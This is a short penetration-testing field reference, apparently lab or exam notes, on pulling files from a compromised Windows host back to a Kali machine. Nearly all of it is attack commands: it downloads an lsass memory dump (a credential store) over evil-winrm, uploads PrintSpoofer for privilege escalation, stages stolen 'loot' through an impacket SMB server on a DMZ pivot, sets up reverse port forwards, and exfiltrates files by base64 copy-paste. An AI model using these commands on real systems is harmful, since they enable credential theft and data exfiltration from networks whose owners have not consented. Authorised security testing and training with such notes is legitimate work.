### Pulling files FROM the target to Kali (the hard direction)

**Pivoting and File Transfer: Field Reference**

```bash
# 1) evil-winrm has it built in (pulls over your existing session):
*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse

# 2) Stage through the DMZ (a host the internal box CAN reach):
#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
#    on the internal host:
net use \\172.16.119.13\share /user:u p
copy C:\Temp\loot.zip \\172.16.119.13\share\
#    DMZ -> Kali:
scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/

# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
#    becomes reachable from inside, push to it normally.

# 4) base64 paste (small files / when nothing else works):
#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
#    Kali:     echo '<paste>' | base64 -d > x
```
